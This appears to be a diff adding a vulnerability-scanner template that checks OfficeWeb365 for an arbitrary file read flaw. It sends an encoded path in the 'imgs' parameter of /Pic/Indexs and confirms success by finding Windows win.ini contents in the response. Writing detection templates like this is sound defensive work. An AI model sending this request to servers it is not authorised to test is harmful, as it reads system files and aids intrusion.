@@ -1,0 +1,29 @@
+id: officeweb365-indexs-anyfile-read
+info:
+  name: OfficeWeb365 Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "/Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[fonts]"
+          - "; for 16-bit app support"
+        part: body
+      - type: word
+        words:
+          - "OfficeWeb365"
+        part: header
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
